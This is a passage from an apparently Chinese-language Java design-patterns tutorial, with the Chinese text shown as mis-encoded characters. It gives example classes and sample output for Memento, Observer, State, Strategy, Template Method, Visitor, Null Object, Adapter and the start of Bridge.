doAlarmEvent(); break; case "coffeePot": doCoffeePotEvent(); break; case "calender": doCalenderEvent(); break; default: doSprinklerEvent(); &#125; &#125; public void doAlarmEvent() &#123; alarm.doAlarm(); coffeePot.doCoffeePot(); calender.doCalender(); sprinkler.doSprinkler(); &#125; public void doCoffeePotEvent() &#123; // ... &#125; public void doCalenderEvent() &#123; // ... &#125; public void doSprinklerEvent() &#123; // ... &#125;&#125; 1234567891011public class Client &#123; public static void main(String[] args) &#123; Alarm alarm = new Alarm(); CoffeePot coffeePot = new CoffeePot(); Calender calender = new Calender(); Sprinkler sprinkler = new Sprinkler(); Mediator mediator = new ConcreteMediator(alarm, coffeePot, calender, sprinkler); // é—¹é’Ÿäº‹ä»¶åˆ°è¾¾ï¼Œè°ƒç”¨ä¸­ä»‹è€…å°±å¯ä»¥æ“ä½œç›¸å…³å¯¹è±¡ alarm.onEvent(mediator); &#125;&#125; 1234doAlarm()doCoffeePot()doCalender()doSprinkler() JDK All scheduleXXX() methods of java.util.Timer java.util.concurrent.Executor#execute() submit() and invokeXXX() methods of java.util.concurrent.ExecutorService scheduleXXX() methods of java.util.concurrent.ScheduledExecutorService java.lang.reflect.Method#invoke() 6. å¤‡å¿˜å½•ï¼ˆMementoï¼‰æ„å›¾åœ¨ä¸è¿åå°è£…çš„æƒ…å†µä¸‹è·å¾—å¯¹è±¡çš„å†…éƒ¨çŠ¶æ€ï¼Œä»è€Œåœ¨éœ€è¦æ—¶å¯ä»¥å°†å¯¹è±¡æ¢å¤åˆ°æœ€åˆçŠ¶æ€ã€‚ ç±»å›¾ Originatorï¼šåŸå§‹å¯¹è±¡ Caretakerï¼šè´Ÿè´£ä¿å­˜å¥½å¤‡å¿˜å½• Menentoï¼šå¤‡å¿˜å½•ï¼Œå­˜å‚¨åŸå§‹å¯¹è±¡çš„çš„çŠ¶æ€ã€‚å¤‡å¿˜å½•å®é™…ä¸Šæœ‰ä¸¤ä¸ªæ¥å£ï¼Œä¸€ä¸ªæ˜¯æä¾›ç»™ Caretaker çš„çª„æ¥å£ï¼šå®ƒåªèƒ½å°†å¤‡å¿˜å½•ä¼ é€’ç»™å…¶å®ƒå¯¹è±¡ï¼›ä¸€ä¸ªæ˜¯æä¾›ç»™ Originator çš„å®½æ¥å£ï¼Œå…è®¸å®ƒè®¿é—®åˆ°å…ˆå‰çŠ¶æ€æ‰€éœ€çš„æ‰€æœ‰æ•°æ®ã€‚ç†æƒ³æƒ…å†µæ˜¯åªå…è®¸ Originator è®¿é—®æœ¬å¤‡å¿˜å½•çš„å†…éƒ¨çŠ¶æ€ã€‚ å®ç°ä»¥ä¸‹å®ç°äº†ä¸€ä¸ªç®€å•è®¡ç®—å™¨ç¨‹åºï¼Œå¯ä»¥è¾“å…¥ä¸¤ä¸ªå€¼ï¼Œç„¶åè®¡ç®—è¿™ä¸¤ä¸ªå€¼çš„å’Œã€‚å¤‡å¿˜å½•æ¨¡å¼å…è®¸å°†è¿™ä¸¤ä¸ªå€¼å­˜å‚¨èµ·æ¥ï¼Œç„¶ååœ¨æŸä¸ªæ—¶åˆ»ç”¨å­˜å‚¨çš„çŠ¶æ€è¿›è¡Œæ¢å¤ã€‚ å®ç°å‚è€ƒï¼šMemento Pattern - Calculator Example - Java Sourcecode 1234567891011121314151617/** * Originator Interface */public interface Calculator &#123; // Create Memento PreviousCalculationToCareTaker backupLastCalculation(); // setMemento void restorePreviousCalculation(PreviousCalculationToCareTaker memento); int getCalculationResult(); void setFirstNumber(int firstNumber); void setSecondNumber(int secondNumber);&#125; 123456789101112131415161718192021222324252627282930313233343536/** * Originator Implementation */public class CalculatorImp implements Calculator &#123; private int firstNumber; private int secondNumber; @Override public PreviousCalculationToCareTaker backupLastCalculation() &#123; // create a memento object used for restoring two numbers return new PreviousCalculationImp(firstNumber, secondNumber); &#125; @Override public void restorePreviousCalculation(PreviousCalculationToCareTaker memento) &#123; this.firstNumber = ((PreviousCalculationToOriginator) memento).getFirstNumber(); this.secondNumber = ((PreviousCalculationToOriginator) memento).getSecondNumber(); &#125; @Override public int getCalculationResult() &#123; // result is adding two numbers return firstNumber + secondNumber; &#125; @Override public void setFirstNumber(int firstNumber) &#123; this.firstNumber = firstNumber; &#125; @Override public void setSecondNumber(int secondNumber) &#123; this.secondNumber = secondNumber; &#125;&#125; 123456789/** * Memento Interface to Originator * * This interface allows the originator to restore its state */public interface PreviousCalculationToOriginator &#123; int getFirstNumber(); int getSecondNumber();&#125; 123456/** * Memento interface to CalculatorOperator (Caretaker) */public interface PreviousCalculationToCareTaker &#123; // no operations permitted for the caretaker&#125; 1234567891011121314151617181920212223242526/** * Memento Object Implementation * &lt;p&gt; * Note that this object implements both interfaces to Originator and CareTaker */public class PreviousCalculationImp implements PreviousCalculationToCareTaker, PreviousCalculationToOriginator &#123; private int firstNumber; private int secondNumber; public PreviousCalculationImp(int firstNumber, int secondNumber) &#123; this.firstNumber = firstNumber; this.secondNumber = secondNumber; &#125; @Override public int getFirstNumber() &#123; return firstNumber; &#125; @Override public int getSecondNumber() &#123; return secondNumber; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435/** * CareTaker object */public class Client &#123; public static void main(String[] args) &#123; // program starts Calculator calculator = new CalculatorImp(); // assume user enters two numbers calculator.setFirstNumber(10); calculator.setSecondNumber(100); // find result System.out.println(calculator.getCalculationResult()); // Store result of this calculation in case of error PreviousCalculationToCareTaker memento = calculator.backupLastCalculation(); // user enters a number calculator.setFirstNumber(17); // user enters a wrong second number and calculates result calculator.setSecondNumber(-290); // calculate result System.out.println(calculator.getCalculationResult()); // user hits CTRL + Z to undo last operation and see last result calculator.restorePreviousCalculation(memento); // result restored System.out.println(calculator.getCalculationResult()); &#125;&#125; 123110-273110 JDK java.io.Serializable 7. è§‚å¯Ÿè€…ï¼ˆObserverï¼‰æ„å›¾å®šä¹‰å¯¹è±¡ä¹‹é—´çš„ä¸€å¯¹å¤šä¾èµ–ï¼Œå½“ä¸€ä¸ªå¯¹è±¡çŠ¶æ€æ”¹å˜æ—¶ï¼Œå®ƒçš„æ‰€æœ‰ä¾èµ–éƒ½ä¼šæ”¶åˆ°é€šçŸ¥å¹¶ä¸”è‡ªåŠ¨æ›´æ–°çŠ¶æ€ã€‚ ä¸»é¢˜ï¼ˆSubjectï¼‰æ˜¯è¢«è§‚å¯Ÿçš„å¯¹è±¡ï¼Œè€Œå…¶æ‰€æœ‰ä¾èµ–è€…ï¼ˆObserverï¼‰ç§°ä¸ºè§‚å¯Ÿè€…ã€‚ ç±»å›¾ä¸»é¢˜ï¼ˆSubjectï¼‰å…·æœ‰æ³¨å†Œå’Œç§»é™¤è§‚å¯Ÿè€…ã€å¹¶é€šçŸ¥æ‰€æœ‰è§‚å¯Ÿè€…çš„åŠŸèƒ½ï¼Œä¸»é¢˜æ˜¯é€šè¿‡ç»´æŠ¤ä¸€å¼ è§‚å¯Ÿè€…åˆ—è¡¨æ¥å®ç°è¿™äº›æ“ä½œçš„ã€‚ è§‚å¯Ÿè€…ï¼ˆObserverï¼‰çš„æ³¨å†ŒåŠŸèƒ½éœ€è¦è°ƒç”¨ä¸»é¢˜çš„ registerObserver() æ–¹æ³•ã€‚ å®ç°å¤©æ°”æ•°æ®å¸ƒå‘Šæ¿ä¼šåœ¨å¤©æ°”ä¿¡æ¯å‘ç”Ÿæ”¹å˜æ—¶æ›´æ–°å…¶å†…å®¹ï¼Œå¸ƒå‘Šæ¿æœ‰å¤šä¸ªï¼Œå¹¶ä¸”åœ¨å°†æ¥ä¼šç»§ç»­å¢åŠ ã€‚ 1234567public interface Subject &#123; void resisterObserver(Observer o); void removeObserver(Observer o); void notifyObserver();&#125; 12345678910111213141516171819202122232425262728293031323334353637public class WeatherData implements Subject &#123; private List&lt;Observer&gt; observers; private float temperature; private float humidity; private float pressure; public WeatherData() &#123; observers = new ArrayList&lt;&gt;(); &#125; public void setMeasurements(float temperature, float humidity, float pressure) &#123; this.temperature = temperature; this.humidity = humidity; this.pressure = pressure; notifyObserver(); &#125; @Override public void resisterObserver(Observer o) &#123; observers.add(o); &#125; @Override public void removeObserver(Observer o) &#123; int i = observers.indexOf(o); if (i &gt;= 0) &#123; observers.remove(i); &#125; &#125; @Override public void notifyObserver() &#123; for (Observer o : observers) &#123; o.update(temperature, humidity, pressure); &#125; &#125;&#125; 123public interface Observer &#123; void update(float temp, float humidity, float pressure);&#125; 1234567891011public class StatisticsDisplay implements Observer &#123; public StatisticsDisplay(Subject weatherData) &#123; weatherData.resisterObserver(this); &#125; @Override public void update(float temp, float humidity, float pressure) &#123; System.out.println("StatisticsDisplay.update: " + temp + " " + humidity + " " + pressure); &#125;&#125; 1234567891011public class CurrentConditionsDisplay implements Observer &#123; public CurrentConditionsDisplay(Subject weatherData) &#123; weatherData.resisterObserver(this); &#125; @Override public void update(float temp, float humidity, float pressure) &#123; System.out.println("CurrentConditionsDisplay.update: " + temp + " " + humidity + " " + pressure); &#125;&#125; 12345678910public class WeatherStation &#123; public static void main(String[] args) &#123; WeatherData weatherData = new WeatherData(); CurrentConditionsDisplay currentConditionsDisplay = new CurrentConditionsDisplay(weatherData); StatisticsDisplay statisticsDisplay = new StatisticsDisplay(weatherData); weatherData.setMeasurements(0, 0, 0); weatherData.setMeasurements(1, 1, 1); &#125;&#125; 1234CurrentConditionsDisplay.update: 0.0 0.0 0.0StatisticsDisplay.update: 0.0 0.0 0.0CurrentConditionsDisplay.update: 1.0 1.0 1.0StatisticsDisplay.update: 1.0 1.0 1.0 JDK java.util.Observer java.util.EventListener javax.servlet.http.HttpSessionBindingListener RxJava 8. çŠ¶æ€ï¼ˆStateï¼‰æ„å›¾å…è®¸å¯¹è±¡åœ¨å†…éƒ¨çŠ¶æ€æ”¹å˜æ—¶æ”¹å˜å®ƒçš„è¡Œä¸ºï¼Œå¯¹è±¡çœ‹èµ·æ¥å¥½åƒä¿®æ”¹äº†å®ƒæ‰€å±çš„ç±»ã€‚ ç±»å›¾ å®ç°ç³–æœé”€å”®æœºæœ‰å¤šç§çŠ¶æ€ï¼Œæ¯ç§çŠ¶æ€ä¸‹é”€å”®æœºæœ‰ä¸åŒçš„è¡Œä¸ºï¼ŒçŠ¶æ€å¯ä»¥å‘ç”Ÿè½¬ç§»ï¼Œä½¿å¾—é”€å”®æœºçš„è¡Œä¸ºä¹Ÿå‘ç”Ÿæ”¹å˜ã€‚ 123456789101112131415161718192021public interface State &#123; /** * æŠ•å…¥ 25 åˆ†é’± */ void insertQuarter(); /** * é€€å› 25 åˆ†é’± */ void ejectQuarter(); /** * è½¬åŠ¨æ›²æŸ„ */ void turnCrank(); /** * å‘æ”¾ç³–æœ */ void dispense();&#125; 123456789101112131415161718192021222324252627282930public class HasQuarterState implements State &#123; private GumballMachine gumballMachine; public HasQuarterState(GumballMachine gumballMachine) &#123; this.gumballMachine = gumballMachine; &#125; @Override public void insertQuarter() &#123; System.out.println("You can't insert another quarter"); &#125; @Override public void ejectQuarter() &#123; System.out.println("Quarter returned"); gumballMachine.setState(gumballMachine.getNoQuarterState()); &#125; @Override public void turnCrank() &#123; System.out.println("You turned..."); gumballMachine.setState(gumballMachine.getSoldState()); &#125; @Override public void dispense() &#123; System.out.println("No gumball dispensed"); &#125;&#125; 1234567891011121314151617181920212223242526272829public class NoQuarterState implements State &#123; GumballMachine gumballMachine; public NoQuarterState(GumballMachine gumballMachine) &#123; this.gumballMachine = gumballMachine; &#125; @Override public void insertQuarter() &#123; System.out.println("You insert a quarter"); gumballMachine.setState(gumballMachine.getHasQuarterState()); &#125; @Override public void ejectQuarter() &#123; System.out.println("You haven't insert a quarter"); &#125; @Override public void turnCrank() &#123; System.out.println("You turned, but there's no quarter"); &#125; @Override public void dispense() &#123; System.out.println("You need to pay first"); &#125;&#125; 12345678910111213141516171819202122232425262728public class SoldOutState implements State &#123; GumballMachine gumballMachine; public SoldOutState(GumballMachine gumballMachine) &#123; this.gumballMachine = gumballMachine; &#125; @Override public void insertQuarter() &#123; System.out.println("You can't insert a quarter, the machine is sold out"); &#125; @Override public void ejectQuarter() &#123; System.out.println("You can't eject, you haven't inserted a quarter yet"); &#125; @Override public void turnCrank() &#123; System.out.println("You turned, but there are no gumballs"); &#125; @Override public void dispense() &#123; System.out.println("No gumball dispensed"); &#125;&#125; 12345678910111213141516171819202122232425262728293031323334public class SoldState implements State &#123; GumballMachine gumballMachine; public SoldState(GumballMachine gumballMachine) &#123; this.gumballMachine = gumballMachine; &#125; @Override public void insertQuarter() &#123; System.out.println("Please wait, we're already giving you a gumball"); &#125; @Override public void ejectQuarter() &#123; System.out.println("Sorry, you already turned the crank"); &#125; @Override public void turnCrank() &#123; System.out.println("Turning twice doesn't get you another gumball!"); &#125; @Override public void dispense() &#123; gumballMachine.releaseBall(); if (gumballMachine.getCount() &gt; 0) &#123; gumballMachine.setState(gumballMachine.getNoQuarterState()); &#125; else &#123; System.out.println("Oops, out of gumballs"); gumballMachine.setState(gumballMachine.getSoldOutState()); &#125; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768public class GumballMachine &#123; private State soldOutState; private State noQuarterState; private State hasQuarterState; private State soldState; private State state; private int count = 0; public GumballMachine(int numberGumballs) &#123; count = numberGumballs; soldOutState = new SoldOutState(this); noQuarterState = new NoQuarterState(this); hasQuarterState = new HasQuarterState(this); soldState = new SoldState(this); if (numberGumballs &gt; 0) &#123; state = noQuarterState; &#125; else &#123; state = soldOutState; &#125; &#125; public void insertQuarter() &#123; state.insertQuarter(); &#125; public void ejectQuarter() &#123; state.ejectQuarter(); &#125; public void turnCrank() &#123; state.turnCrank(); state.dispense(); &#125; public void setState(State state) &#123; this.state = state; &#125; public void releaseBall() &#123; System.out.println("A gumball comes rolling out the slot..."); if (count != 0) &#123; count -= 1; &#125; &#125; public State getSoldOutState() &#123; return soldOutState; &#125; public State getNoQuarterState() &#123; return noQuarterState; &#125; public State getHasQuarterState() &#123; return hasQuarterState; &#125; public State getSoldState() &#123; return soldState; &#125; public int getCount() &#123; return count; &#125;&#125; 123456789101112131415161718192021222324252627public class Client &#123; public static void main(String[] args) &#123; GumballMachine gumballMachine = new GumballMachine(5); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.ejectQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.ejectQuarter(); gumballMachine.insertQuarter(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); &#125;&#125; 12345678910111213141516171819202122232425You insert a quarterYou turned...A gumball comes rolling out the slot...You insert a quarterQuarter returnedYou turned, but there's no quarterYou need to pay firstYou insert a quarterYou turned...A gumball comes rolling out the slot...You insert a quarterYou turned...A gumball comes rolling out the slot...You haven't insert a quarterYou insert a quarterYou can't insert another quarterYou turned...A gumball comes rolling out the slot...You insert a quarterYou turned...A gumball comes rolling out the slot...Oops, out of gumballsYou can't insert a quarter, the machine is sold outYou turned, but there are no gumballsNo gumball dispensed 9. ç­–ç•¥ï¼ˆStrategyï¼‰æ„å›¾å®šä¹‰ä¸€ç³»åˆ—ç®—æ³•ï¼Œå°è£…æ¯ä¸ªç®—æ³•ï¼Œå¹¶ä½¿å®ƒä»¬å¯ä»¥äº’æ¢ã€‚ ç­–ç•¥æ¨¡å¼å¯ä»¥è®©ç®—æ³•ç‹¬ç«‹äºä½¿ç”¨å®ƒçš„å®¢æˆ·ç«¯ã€‚ ç±»å›¾ Strategy æ¥å£å®šä¹‰äº†ä¸€ä¸ªç®—æ³•æ—ï¼Œå®ƒä»¬éƒ½å…·æœ‰ behavior() æ–¹æ³•ã€‚ Context æ˜¯ä½¿ç”¨åˆ°è¯¥ç®—æ³•æ—çš„ç±»ï¼Œå…¶ä¸­çš„ doSomething() æ–¹æ³•ä¼šè°ƒç”¨ behavior()ï¼ŒsetStrategy(in Strategy) æ–¹æ³•å¯ä»¥åŠ¨æ€åœ°æ”¹å˜ strategy å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯è¯´èƒ½åŠ¨æ€åœ°æ”¹å˜ Context æ‰€ä½¿ç”¨çš„ç®—æ³•ã€‚ ä¸çŠ¶æ€æ¨¡å¼çš„æ¯”è¾ƒçŠ¶æ€æ¨¡å¼çš„ç±»å›¾å’Œç­–ç•¥æ¨¡å¼ç±»ä¼¼ï¼Œå¹¶ä¸”éƒ½æ˜¯èƒ½å¤ŸåŠ¨æ€æ”¹å˜å¯¹è±¡çš„è¡Œä¸ºã€‚ ä½†æ˜¯çŠ¶æ€æ¨¡å¼æ˜¯é€šè¿‡çŠ¶æ€è½¬ç§»æ¥æ”¹å˜ Context æ‰€ç»„åˆçš„ State å¯¹è±¡ï¼Œè€Œç­–ç•¥æ¨¡å¼æ˜¯é€šè¿‡ Context æœ¬èº«çš„å†³ç­–æ¥æ”¹å˜ç»„åˆçš„ Strategy å¯¹è±¡ã€‚ æ‰€è°“çš„çŠ¶æ€è½¬ç§»ï¼Œæ˜¯æŒ‡ Context åœ¨è¿è¡Œè¿‡ç¨‹ä¸­ç”±äºä¸€äº›æ¡ä»¶å‘ç”Ÿæ”¹å˜è€Œä½¿å¾— State å¯¹è±¡å‘ç”Ÿæ”¹å˜ï¼Œæ³¨æ„å¿…é¡»è¦æ˜¯åœ¨è¿è¡Œè¿‡ç¨‹ä¸­ã€‚ çŠ¶æ€æ¨¡å¼ä¸»è¦æ˜¯ç”¨æ¥è§£å†³çŠ¶æ€è½¬ç§»çš„é—®é¢˜ï¼Œå½“çŠ¶æ€å‘ç”Ÿè½¬ç§»äº†ï¼Œé‚£ä¹ˆ Context å¯¹è±¡å°±ä¼šæ”¹å˜å®ƒçš„è¡Œä¸ºï¼›è€Œç­–ç•¥æ¨¡å¼ä¸»è¦æ˜¯ç”¨æ¥å°è£…ä¸€ç»„å¯ä»¥äº’ç›¸æ›¿ä»£çš„ç®—æ³•æ—ï¼Œå¹¶ä¸”å¯ä»¥æ ¹æ®éœ€è¦åŠ¨æ€åœ°å»æ›¿æ¢ Context ä½¿ç”¨çš„ç®—æ³•ã€‚ å®ç°è®¾è®¡ä¸€ä¸ªé¸­å­ï¼Œå®ƒå¯ä»¥åŠ¨æ€åœ°æ”¹å˜å«å£°ã€‚è¿™é‡Œçš„ç®—æ³•æ—æ˜¯é¸­å­çš„å«å£°è¡Œä¸ºã€‚ 123public interface QuackBehavior &#123; void quack();&#125; 123456public class Quack implements QuackBehavior &#123; @Override public void quack() &#123; System.out.println("quack!"); &#125;&#125; 123456public class Squeak implements QuackBehavior&#123; @Override public void quack() &#123; System.out.println("squeak!"); &#125;&#125; 12345678910111213public class Duck &#123; private QuackBehavior quackBehavior; public void performQuack() &#123; if (quackBehavior != null) &#123; quackBehavior.quack(); &#125; &#125; public void setQuackBehavior(QuackBehavior quackBehavior) &#123; this.quackBehavior = quackBehavior; &#125;&#125; 123456789public class Client &#123; public static void main(String[] args) &#123; Duck duck = new Duck(); duck.setQuackBehavior(new Squeak()); duck.performQuack(); duck.setQuackBehavior(new Quack()); duck.performQuack(); &#125;&#125; 12squeak!quack! JDK java.util.Comparator#compare() javax.servlet.http.HttpServlet javax.servlet.Filter#doFilter() 10. æ¨¡æ¿æ–¹æ³•ï¼ˆTemplate Methodï¼‰æ„å›¾å®šä¹‰ç®—æ³•æ¡†æ¶ï¼Œå¹¶å°†ä¸€äº›æ­¥éª¤çš„å®ç°å»¶è¿Ÿåˆ°å­ç±»ã€‚ é€šè¿‡æ¨¡æ¿æ–¹æ³•ï¼Œå­ç±»å¯ä»¥é‡æ–°å®šä¹‰ç®—æ³•çš„æŸäº›æ­¥éª¤ï¼Œè€Œä¸ç”¨æ”¹å˜ç®—æ³•çš„ç»“æ„ã€‚ ç±»å›¾ å®ç°å†²å’–å•¡å’Œå†²èŒ¶éƒ½æœ‰ç±»ä¼¼çš„æµç¨‹ï¼Œä½†æ˜¯æŸäº›æ­¥éª¤ä¼šæœ‰ç‚¹ä¸ä¸€æ ·ï¼Œè¦æ±‚å¤ç”¨é‚£äº›ç›¸åŒæ­¥éª¤çš„ä»£ç ã€‚ 123456789101112131415161718192021public abstract class CaffeineBeverage &#123; final void prepareRecipe() &#123; boilWater(); brew(); pourInCup(); addCondiments(); &#125; abstract void brew(); abstract void addCondiments(); void boilWater() &#123; System.out.println("boilWater"); &#125; void pourInCup() &#123; System.out.println("pourInCup"); &#125;&#125; 1234567891011public class Coffee extends CaffeineBeverage&#123; @Override void brew() &#123; System.out.println("Coffee.brew"); &#125; @Override void addCondiments() &#123; System.out.println("Coffee.addCondiments"); &#125;&#125; 1234567891011public class Tea extends CaffeineBeverage&#123; @Override void brew() &#123; System.out.println("Tea.brew"); &#125; @Override void addCondiments() &#123; System.out.println("Tea.addCondiments"); &#125;&#125; 123456789public class Client &#123; public static void main(String[] args) &#123; CaffeineBeverage caffeineBeverage = new Coffee(); caffeineBeverage.prepareRecipe(); System.out.println("-----------"); caffeineBeverage = new Tea(); caffeineBeverage.prepareRecipe(); &#125;&#125; 123456789boilWaterCoffee.brewpourInCupCoffee.addCondiments-----------boilWaterTea.brewpourInCupTea.addCondiments JDK java.util.Collections#sort() java.io.InputStream#skip() java.io.InputStream#read() java.util.AbstractList#indexOf() 11. è®¿é—®è€…ï¼ˆVisitorï¼‰æ„å›¾ä¸ºä¸€ä¸ªå¯¹è±¡ç»“æ„ï¼ˆæ¯”å¦‚ç»„åˆç»“æ„ï¼‰å¢åŠ æ–°èƒ½åŠ›ã€‚ ç±»å›¾ Visitorï¼šè®¿é—®è€…ï¼Œä¸ºæ¯ä¸€ä¸ª ConcreteElement å£°æ˜ä¸€ä¸ª visit æ“ä½œ ConcreteVisitorï¼šå…·ä½“è®¿é—®è€…ï¼Œå­˜å‚¨éå†è¿‡ç¨‹ä¸­çš„ç´¯è®¡ç»“æœ ObjectStructureï¼šå¯¹è±¡ç»“æ„ï¼Œå¯ä»¥æ˜¯ç»„åˆç»“æ„ï¼Œæˆ–è€…æ˜¯ä¸€ä¸ªé›†åˆã€‚ å®ç°123public interface Element &#123; void accept(Visitor visitor);&#125; 1234567891011121314class CustomerGroup &#123; private List&lt;Customer&gt; customers = new ArrayList&lt;&gt;(); void accept(Visitor visitor) &#123; for (Customer customer : customers) &#123; customer.accept(visitor); &#125; &#125; void addCustomer(Customer customer) &#123; customers.add(customer); &#125;&#125; 123456789101112131415161718192021222324public class Customer implements Element &#123; private String name; private List&lt;Order&gt; orders = new ArrayList&lt;&gt;(); Customer(String name) &#123; this.name = name; &#125; String getName() &#123; return name; &#125; void addOrder(Order order) &#123; orders.add(order); &#125; public void accept(Visitor visitor) &#123; visitor.visit(this); for (Order order : orders) &#123; order.accept(visitor); &#125; &#125;&#125; 123456789101112131415161718192021222324252627282930public class Order implements Element &#123; private String name; private List&lt;Item&gt; items = new ArrayList(); Order(String name) &#123; this.name = name; &#125; Order(String name, String itemName) &#123; this.name = name; this.addItem(new Item(itemName)); &#125; String getName() &#123; return name; &#125; void addItem(Item item) &#123; items.add(item); &#125; public void accept(Visitor visitor) &#123; visitor.visit(this); for (Item item : items) &#123; item.accept(visitor); &#125; &#125;&#125; 12345678910111213141516public class Item implements Element &#123; private String name; Item(String name) &#123; this.name = name; &#125; String getName() &#123; return name; &#125; public void accept(Visitor visitor) &#123; visitor.visit(this); &#125;&#125; 1234567public interface Visitor &#123; void visit(Customer customer); void visit(Order order); void visit(Item item);&#125; 123456789101112131415161718192021222324252627public class GeneralReport implements Visitor &#123; private int customersNo; private int ordersNo; private int itemsNo; public void visit(Customer customer) &#123; System.out.println(customer.getName()); customersNo++; &#125; public void visit(Order order) &#123; System.out.println(order.getName()); ordersNo++; &#125; public void visit(Item item) &#123; System.out.println(item.getName()); itemsNo++; &#125; public void displayResults() &#123; System.out.println("Number of customers: " + customersNo); System.out.println("Number of orders: " + ordersNo); System.out.println("Number of items: " + itemsNo); &#125;&#125; 1234567891011121314151617181920212223public class Client &#123; public static void main(String[] args) &#123; Customer customer1 = new Customer("customer1"); customer1.addOrder(new Order("order1", "item1")); customer1.addOrder(new Order("order2", "item1")); customer1.addOrder(new Order("order3", "item1")); Order order = new Order("order_a"); order.addItem(new Item("item_a1")); order.addItem(new Item("item_a2")); order.addItem(new Item("item_a3")); Customer customer2 = new Customer("customer2"); customer2.addOrder(order); CustomerGroup customers = new CustomerGroup(); customers.addCustomer(customer1); customers.addCustomer(customer2); GeneralReport visitor = new GeneralReport(); customers.accept(visitor); visitor.displayResults(); &#125;&#125; 123456789101112131415customer1order1item1order2item1order3item1customer2order_aitem_a1item_a2item_a3Number of customers: 2Number of orders: 4Number of items: 6 JDK javax.lang.model.element.Element and javax.lang.model.element.ElementVisitor javax.lang.model.type.TypeMirror and javax.lang.model.type.TypeVisitor 12. ç©ºå¯¹è±¡ï¼ˆNullï¼‰æ„å›¾ä½¿ç”¨ä»€ä¹ˆéƒ½ä¸åšçš„ç©ºå¯¹è±¡æ¥æ›¿ä»£ NULLã€‚ ä¸€ä¸ªæ–¹æ³•è¿”å› NULLï¼Œæ„å‘³ç€æ–¹æ³•çš„è°ƒç”¨ç«¯éœ€è¦å»æ£€æŸ¥è¿”å›å€¼æ˜¯å¦æ˜¯ NULLï¼Œè¿™ä¹ˆåšä¼šå¯¼è‡´éå¸¸å¤šçš„å†—ä½™çš„æ£€æŸ¥ä»£ç ã€‚å¹¶ä¸”å¦‚æœæŸä¸€ä¸ªè°ƒç”¨ç«¯å¿˜è®°äº†åšè¿™ä¸ªæ£€æŸ¥è¿”å›å€¼ï¼Œè€Œç›´æ¥ä½¿ç”¨è¿”å›çš„å¯¹è±¡ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½æŠ›å‡ºç©ºæŒ‡é’ˆå¼‚å¸¸ã€‚ ç±»å›¾ å®ç°123public abstract class AbstractOperation &#123; abstract void request();&#125; 123456public class RealOperation extends AbstractOperation &#123; @Override void request() &#123; System.out.println("do something"); &#125;&#125; 123456public class NullOperation extends AbstractOperation&#123; @Override void request() &#123; // do nothing &#125;&#125; 12345678910111213public class Client &#123; public static void main(String[] args) &#123; AbstractOperation abstractOperation = func(-1); abstractOperation.request(); &#125; public static AbstractOperation func(int para) &#123; if (para &lt; 0) &#123; return new NullOperation(); &#125; return new RealOperation(); &#125;&#125; å››ã€ç»“æ„å‹1. é€‚é…å™¨ï¼ˆAdapterï¼‰æ„å›¾æŠŠä¸€ä¸ªç±»æ¥å£è½¬æ¢æˆå¦ä¸€ä¸ªç”¨æˆ·éœ€è¦çš„æ¥å£ã€‚ ç±»å›¾ å®ç°é¸­å­ï¼ˆDuckï¼‰å’Œç«é¸¡ï¼ˆTurkeyï¼‰æ‹¥æœ‰ä¸åŒçš„å«å£°ï¼ŒDuck çš„å«å£°è°ƒç”¨ quack() æ–¹æ³•ï¼Œè€Œ Turkey è°ƒç”¨ gobble() æ–¹æ³•ã€‚ è¦æ±‚å°† Turkey çš„ gobble() æ–¹æ³•é€‚é…æˆ Duck çš„ quack() æ–¹æ³•ï¼Œä»è€Œè®©ç«é¸¡å†’å……é¸­å­ï¼ 123public interface Duck &#123; void quack();&#125; 123public interface Turkey &#123; void gobble();&#125; 123456public class WildTurkey implements Turkey &#123; @Override public void gobble() &#123; System.out.println("gobble!"); &#125;&#125; 123456789101112public class TurkeyAdapter implements Duck &#123; Turkey turkey; public TurkeyAdapter(Turkey turkey) &#123; this.turkey = turkey; &#125; @Override public void quack() &#123; turkey.gobble(); &#125;&#125; 1234567public class Client &#123; public static void main(String[] args) &#123; Turkey turkey = new WildTurkey(); Duck duck = new TurkeyAdapter(turkey); duck.quack(); &#125;&#125; JDK java.util.Arrays#asList() java.util.Collections#list() java.util.Collections#enumeration() javax.xml.bind.annotation.adapters.XMLAdapter 2. æ¡¥æ¥ï¼ˆBridgeï¼‰æ„å›¾å°†æŠ½è±¡ä¸å®ç°åˆ†ç¦»å¼€æ¥ï¼Œä½¿å®ƒä»¬å¯ä»¥ç‹¬ç«‹å˜åŒ–ã€‚ ç±»å›¾ Abstractionï¼šå®šä¹‰æŠ½è±¡ç±»çš„æ¥å£ Implementorï¼šå®šä¹‰å®ç°ç±»æ¥å£ å®ç°RemoteControl è¡¨ç¤ºé¥æ§å™¨ï¼ŒæŒ‡ä»£ Abstractionã€‚ TV è¡¨ç¤ºç”µè§†ï¼ŒæŒ‡ä»£ Implementorã€‚ æ¡¥æ¥æ¨¡å¼å°†é¥æ§å™¨å’Œç”µè§†åˆ†ç¦»å¼€æ¥ï¼Œä»è€Œå¯ä»¥ç‹¬ç«‹æ”¹å˜é¥æ§å™¨æˆ–è€…ç”µè§†çš„å®ç°ã€‚ 1234567public abstract class TV &#123; public abstract void on(); public abstract void off(); public abstract void tuneChannel();&#125; 12345678910111213141516public class Sony extends TV&#123; @Override public void on() &#123; System.out.println("Sony.on()"); &#125; @Override public void off() &#123; System.out.println("Sony.off()"); &#125; @Override public void tuneChannel() &#123; System.out.println("Sony.tuneChannel()"); &#125;&#125; 12345678910111213141516public class RCA extends TV&#123; @Override public void on() &#123; System.out.println("RCA.on()"); &#125; @Override public void off() &#123; System.out.println("RCA.off()"); &#125; @Override public void tuneChannel() &#123; System.out.println("RCA.tuneChannel()"); &#125;&#125; 12345678910111213public abstract class RemoteControl &#123; protected TV tv; public RemoteControl(TV tv) &#123; this.tv = tv; &#125; public abstract void on(); public abstract void off(); public abstract void tuneChannel();&#125; 1234567891011121314151617181920212223public class ConcreteRemoteControl1 extends RemoteControl &#123; public ConcreteRemoteControl1(TV 